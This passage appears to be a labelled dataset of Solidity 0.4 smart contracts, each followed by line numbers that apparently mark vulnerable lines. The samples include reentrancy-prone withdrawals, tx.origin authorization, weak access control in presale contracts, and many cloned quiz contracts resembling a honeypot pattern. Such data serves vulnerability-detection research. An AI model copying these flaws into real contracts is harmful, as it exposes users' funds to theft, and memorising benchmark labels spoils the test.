contract PresaleFund {
    bool isClosed;
    struct Deposit { address buyer; uint amount; }
    uint refundDate;
    address fiduciary = msg.sender;
    Deposit[] Deposits;
    mapping (address => uint) total;
    function() public payable { }
    function init(uint date)
    {
        refundDate = date;
    }
    function deposit()
    public payable {
        if (msg.value >= 0.25 ether && !isClosed)
        {
            Deposit newDeposit;
            newDeposit.buyer = msg.sender;
            newDeposit.amount = msg.value;
            Deposits.push(newDeposit);
            total[msg.sender] += msg.value;
        }
        if (this.balance >= 25 ether)
        {
            isClosed = true;
        }
    }
    function refund(uint amount)
    public {
        if (total[msg.sender] >= amount && amount > 0)
        {
            if (now >= refundDate && isClosed==false)
            {
                msg.sender.transfer(amount);
            }
        }
    }
    function close()
    public {
        if (msg.sender == fiduciary)
        {
            msg.sender.transfer(this.balance);
            isClosed = true;
        }
    }
}",[33]
"    modifier stateAllowsConfiguration() {
        require(state == State.Open || state == State.Closed);
        _;
    }
    bool locked;
    modifier noReentrancy() {
        require(!locked);
        locked = true;
        _;
        locked = false;
    }
    function PresalePool(uint _minContribution, uint _maxContribution, uint _maxPoolTotal, address[] _admins) payable {
        state = State.Open;
        admins.push(msg.sender);
        setContributionSettings(_minContribution, _maxContribution, _maxPoolTotal);
        whitelistAll = true;
        for (uint i = 0; i < _admins.length; i++) {
            var admin = _admins[i];
            if (!isAdmin(admin)) {
                admins.push(admin);
            }
        }
        deposit();
    }
    function () payable {
        deposit();
    }
    function close() public onlyAdmins onState(State.Open) {
        state = State.Closed;
    }
    function open() public onlyAdmins onState(State.Closed) {
        state = State.Open;
    }
    function fail() public onlyAdmins stateAllowsConfiguration {
        state = State.Failed;
    }
    function payToPresale(address _presaleAddress) public onlyAdmins onState(State.Closed) {
        state = State.Paid;
        presaleAddress = _presaleAddress;
        refundable = true;
        presaleAddress.transfer(poolTotal);
    }
    function refundPresale() payable public onState(State.Paid) {
        require(refundable && msg.value >= poolTotal);
        require(msg.sender == presaleAddress || isAdmin(msg.sender));
        gasFundTotal = msg.value - poolTotal;
        state = State.Failed;
    }
    function setToken(address tokenAddress) public onlyAdmins {
        token = ERC20(tokenAddress);
    }
    function withdrawAll() public {
        uint total = balances[msg.sender].remaining;
        balances[msg.sender].remaining = 0;
        if (state == State.Open || state == State.Failed) {
            total += balances[msg.sender].contribution;
            if (gasFundTotal > 0) {
                uint gasRefund = (balances[msg.sender].contribution * gasFundTotal) / (poolTotal);
                gasFundTotal -= gasRefund;
                total += gasRefund;
            }
            poolTotal -= balances[msg.sender].contribution;
            balances[msg.sender].contribution = 0;
        } else {
            require(state == State.Paid);
        }
        msg.sender.transfer(total);
        Withdrawl(msg.sender, total);
    }
    function withdraw(uint amount) public onState(State.Open) {
        uint total = balances[msg.sender].remaining + balances[msg.sender].contribution;
        require(total >= amount);
        uint debit = min(balances[msg.sender].remaining, amount);
        balances[msg.sender].remaining -= debit;
        debit = amount - debit;
        balances[msg.sender].contribution -= debit;
        poolTotal -= debit;
        (balances[msg.sender].contribution, balances[msg.sender].remaining) = getContribution(msg.sender, 0);
        // must respect the minContribution limit
        require(balances[msg.sender].remaining == 0 || balances[msg.sender].contribution > 0);
        msg.sender.transfer(amount);
        Withdrawl(msg.sender, amount);
    }
    function transferMyTokens() public onState(State.Paid) noReentrancy {
        uint tokenBalance = token.balanceOf(address(this));
        require(tokenBalance > 0);
        uint participantContribution = balances[msg.sender].contribution;
        uint participantShare = participantContribution * tokenBalance / poolTotal;
        poolTotal -= participantContribution;
        balances[msg.sender].contribution = 0;
        refundable = false;
        require(token.transfer(msg.sender, participantShare));
        Payout(msg.sender, participantShare);
    }
    address[] public failures;
    function transferAllTokens() public onlyAdmins onState(State.Paid) noReentrancy returns (address[]) {
        uint tokenBalance = token.balanceOf(address(this));
        require(tokenBalance > 0);
        delete failures;
        for (uint i = 0; i < participants.length; i++) {
            address participant = participants[i];
            uint participantContribution = balances[participant].contribution;
            if (participantContribution > 0) {
                uint participantShare = participantContribution * tokenBalance / poolTotal;
                poolTotal -= participantContribution;
                balances[participant].contribution = 0;
                if (token.transfer(participant, participantShare)) {
                    refundable = false;
                    Payout(participant, participantShare);
                    tokenBalance -= participantShare;
                    if (tokenBalance == 0) {
                        break;
                    }
                } else {
                    balances[participant].contribution = participantContribution;
                    poolTotal += participantContribution;
                    failures.push(participant);
                }
            }
        }
        return failures;
    }
    function modifyWhitelist(address[] toInclude, address[] toExclude) public onlyAdmins stateAllowsConfiguration {
        bool previous = whitelistAll;
        uint i;
        if (previous) {
            require(toExclude.length == 0);
            for (i = 0; i < participants.length; i++) {","[62, 67]"
"pragma solidity ^0.4.19;
contract PrivateDeposit
{
    mapping (address => uint) public balances;
    uint public MinDeposit = 1 ether;
    address public owner;
    Log TransferLog;
    modifier onlyOwner() {
        require(tx.origin == owner);
        _;
    }    
    function PrivateDeposit()
    {
        owner = msg.sender;
        TransferLog = new Log();
    }
    function setLog(address _lib) onlyOwner
    {
        TransferLog = Log(_lib);
    }    
    function Deposit()
    public
    payable
    {
        if(msg.value >= MinDeposit)
        {
            balances[msg.sender]+=msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,""Deposit"");
        }
    }
    function CashOut(uint _am)
    {
        if(_am<=balances[msg.sender])
        {            
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                TransferLog.AddMessage(msg.sender,_am,""CashOut"");
            }
        }
    }
    function() public payable{}    
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[35, 37]"
"pragma solidity ^0.4.19;
contract Private_accumulation_fund
{
    mapping (address => uint) public balances;
    uint public MinDeposit = 1 ether;
    Log TransferLog;
    function Private_accumulation_fund(address _log)
    public 
    {
        TransferLog = Log(_log);
    }
    function Deposit()
    public
    payable
    {
        if(msg.value > MinDeposit)
        {
            balances[msg.sender]+=msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,""Deposit"");
        }
    }
    function CashOut(uint _am)
    public
    payable
    {
        if(_am<=balances[msg.sender])
        {
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                TransferLog.AddMessage(msg.sender,_am,""CashOut"");
            }
        }
    }
    function() public payable{}    
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[28, 30]"
"pragma solidity ^0.4.25;
contract Promise{
    string public vow;
    address public promisor;
    address public beneficiary;
    uint public deposit;
    uint public endDate;
    address[3] public judges;
    uint[3] public signedByJudge;
    bool public signedByPromisor;
    uint[3] public votedFoul;
    uint public foulVotes = 0;
    uint[3] public votedShy;
    uint public shyVotes = 0;
    uint[3] public votedSuccess;
    uint public successVotes = 0;
    bool public sentMoney = false;
    constructor(address _promisor, string _vow, uint _deposit, uint _endDate, address[3] _judges, address _beneficiary) public{
        promisor = _promisor;
        vow = _vow;
        deposit = _deposit;
        endDate = _endDate;
        judges = _judges;
        beneficiary = _beneficiary;
    }
    function judgeSigns(uint _number) public{
        require(msg.sender == judges[_number]);
        signedByJudge[_number] = 1;
    }
    function promisorSigns() payable public{
        require(msg.sender == promisor);
        require(signedByJudge[0] == 1);
        require(signedByJudge[1] == 1);
        require(signedByJudge[2] == 1);
        require(!signedByPromisor);
        require(msg.value == deposit);
        signedByPromisor = true;
    }
    function voteFoul(uint _number) public{
        require(signedByPromisor);
        require(msg.sender == judges[_number]);
        require(votedFoul[_number] != 1);
        require(votedShy[_number] != 1);
        require(votedSuccess[_number] != 1);
        foulVotes = foulVotes + 1;
        votedFoul[_number] = 1;
        if((foulVotes >= 2) && !sentMoney){
          beneficiary.transfer(deposit);
          sentMoney = true;
        }
    }
    function voteShyOfCondition(uint _number) public{
        require(signedByPromisor);
        require(msg.sender == judges[_number]);
        require(votedShy[_number] != 1);
        require(votedFoul[_number] != 1);
        shyVotes = shyVotes + 1;
        votedShy[_number] = 1;
        if((shyVotes >= 2) && !sentMoney){
          promisor.transfer(deposit);
          sentMoney = true;
        }
    }
    function voteSuccess(uint _number) public{
        require(signedByPromisor);
        require(msg.sender == judges[_number]);
        require(votedSuccess[_number] != 1);
        require(votedFoul[_number] != 1);
        successVotes = successVotes + 1;
        votedSuccess[_number] = 1;
        if((successVotes >= 2) && !sentMoney){
          promisor.transfer(deposit);
          sentMoney = true;
        }
    }
    function selfDestruct() public{
      require(sentMoney);
      require(now >= (endDate+432000));
      selfdestruct(msg.sender);
    }
}","[76, 78, 79]"
"pragma solidity ^0.4.14;
contract QCO_Presale {
    uint closed;
    struct Deposit { address buyer; uint amount; }
    uint refundDate;
    address fiduciary = msg.sender;
    Deposit[] Deposits;
    mapping (address => uint) total;
    function() public payable { }
    function init(uint date)
    {
        refundDate = date;
    }
    function deposit()
    public payable {
        if (msg.value >= 0.5 ether && msg.sender == tx.origin)
        {
            Deposit newDeposit;
            newDeposit.buyer = msg.sender;
            newDeposit.amount = msg.value;
            Deposits.push(newDeposit);
            total[msg.sender] += msg.value;
        }
        if (this.balance >= 25 ether)
        {
            closed = now;
        }
    }
    function refund(uint amount)
    public {
        if (total[msg.sender] >= amount && amount > 0)
        {
            if (now >= refundDate && closed == 0)
            {
                msg.sender.transfer(amount);
            }
        }
    }
    function close()
    public {
        if (msg.sender == fiduciary)
        {
            closed = now;
            msg.sender.transfer(this.balance);
        }
    }
}",[33]
"pragma solidity ^0.4.25;
contract QGAME
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 2 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    bytes32 questionerPin = 0x5c18911b2f0401b04458b5166f91356c9a1235a8d50ee6000a30db9950b7aaf9;
    function Activate(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[26]
"   * @return A uint256 specifying the amount of tokens still available for the spender.
   */
  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
  /**
   * @dev Increase the amount of tokens that an owner allowed to a spender.
   *
   * approve should be called when allowed[_spender] == 0. To increment
   * allowed value is better to use this function to avoid 2 calls (and wait until
   * the first transaction is mined)
   * From MonolithDAO Token.sol
   * @param _spender The address which will spend the funds.
   * @param _addedValue The amount of tokens to increase the allowance by.
   */
  function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
    allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
    Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
  /**
   * @dev Decrease the amount of tokens that an owner allowed to a spender.
   *
   * approve should be called when allowed[_spender] == 0. To decrement
   * allowed value is better to use this function to avoid 2 calls (and wait until
   * the first transaction is mined)
   * From MonolithDAO Token.sol
   * @param _spender The address which will spend the funds.
   * @param _subtractedValue The amount of tokens to decrease the allowance by.
   */
  function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
    uint oldValue = allowed[msg.sender][_spender];
    if (_subtractedValue > oldValue) {
      allowed[msg.sender][_spender] = 0;
    } else {
      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
    }
    Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
}
contract QIUToken is StandardToken,Ownable {
    string public name = 'QIUToken';
    string public symbol = 'QIU';
    uint8 public decimals = 0;
    uint public INITIAL_SUPPLY = 5000000000;
    uint public eth2qiuRate = 10000;
    function() public payable { } // make this contract to receive ethers
    function QIUToken() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[owner] = INITIAL_SUPPLY / 10;
        balances[this] = INITIAL_SUPPLY - balances[owner];
    }
    function getOwner() public view returns (address) {
        return owner;
    }
    /**
    * @dev Transfer tokens from one address to another, only owner can do this super-user operate
    * @param _from address The address which you want to send tokens from
    * @param _to address The address which you want to transfer to
    * @param _value uint256 the amount of tokens to be transferred
    */
    function ownerTransferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(tx.origin == owner); // only the owner can call the method.
        require(_to != address(0));
        require(_value <= balances[_from]);
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);
        Transfer(_from, _to, _value);
        return true;
    }
      /**
    * @dev transfer token for a specified address,but different from transfer is replace msg.sender with tx.origin
    * @param _to The address to transfer to.
    * @param _value The amount to be transferred.
    */
    function originTransfer(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_value <= balances[tx.origin]);
        // SafeMath.sub will throw if there is not enough balance.
        balances[tx.origin] = balances[tx.origin].sub(_value);
        balances[_to] = balances[_to].add(_value);
        Transfer(tx.origin, _to, _value);
        return true;
    }
    event ExchangeForETH(address fromAddr,address to,uint qiuAmount,uint ethAmount);
    function exchangeForETH(uint qiuAmount) public returns (bool){
        uint ethAmount = qiuAmount * 1000000000000000000 / eth2qiuRate; // only accept multiple of 100
        require(this.balance >= ethAmount);
        balances[this] = balances[this].add(qiuAmount);
        balances[msg.sender] = balances[msg.sender].sub(qiuAmount);
        msg.sender.transfer(ethAmount);
        ExchangeForETH(this,msg.sender,qiuAmount,ethAmount);
        return true;
    }
    event ExchangeForQIU(address fromAddr,address to,uint qiuAmount,uint ethAmount);
    function exchangeForQIU() payable public returns (bool){
        uint qiuAmount = msg.value * eth2qiuRate / 1000000000000000000;
        require(qiuAmount <= balances[this]);
        balances[this] = balances[this].sub(qiuAmount);
        balances[msg.sender] = balances[msg.sender].add(qiuAmount);
        ExchangeForQIU(this,msg.sender,qiuAmount,msg.value);
        return true;
    }
    function getETHBalance() public view returns (uint) {
        return this.balance; // balance is ""inherited"" from the address type
    }
}",[64]
"pragma solidity ^0.4.20;
contract QQGAME
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.20;
contract QUESTION
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.20;
contract QUESTQUESTION
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.25;
contract QUEST_OF_QUESTION
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    bytes32 questionerPin = 0xb56cc884730c4737dd0f5a82bc850c64ca849b7f3961679003627cb91249a8bb;
    function Activate(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[26]
"pragma solidity ^0.4.20;
contract QUICK_GAME
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.25;
contract QUICK_QUIZ
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 2 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    bytes32 questionerPin = 0x2f66052a85afaa57dac96fdadae2bbb794178f8448687866370a40a7af19c390;
    function Activate(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[26]
"pragma solidity ^0.4.20;
contract QUICK_QUIZ
{
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.20;
contract QUICK_QUIZ_GAME
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.25;
contract QUIK_QUIZ
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    bytes32 questionerPin = 0x3d65a8897e81ce4b3edd8726ddc88ea044ba4b2bb9d14726acc145df96dc5743;
    function ActivateContract(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[26]
"pragma solidity ^0.4.20;
contract QUIZ
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function SetQUIZ(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.20;
contract QUIZZ
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>=1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function SetQUIZZ(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.20;
contract QUIZZZ
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.20;
contract QUIZ_FF
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.20;
contract QUIZ_GAME
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>=1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function SetQG(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.25;
contract QUIZ_GAME
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    bytes32 questionerPin = 0x2c2cca7277e873a70a445c6320c5c5772360c378dd96986a9958f0c729d9cbd0;
    function ActivateContract(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[26]
"pragma solidity ^0.4.20;
contract QUIZ_MASTER
{
    function Try(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>2 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function init_quiz_master(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.25;
contract QUIZ_QUEST
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    bytes32 questionerPin = 0xba36d8092bf8b2e53ab691b96b196dfb23173083892f2aae4ea4df19d9380e1a;
    function ActivateContract(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[26]
"pragma solidity ^0.4.20;
contract QUIZ_QUEST
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function set_game(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.20;
contract QUI_GAME
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
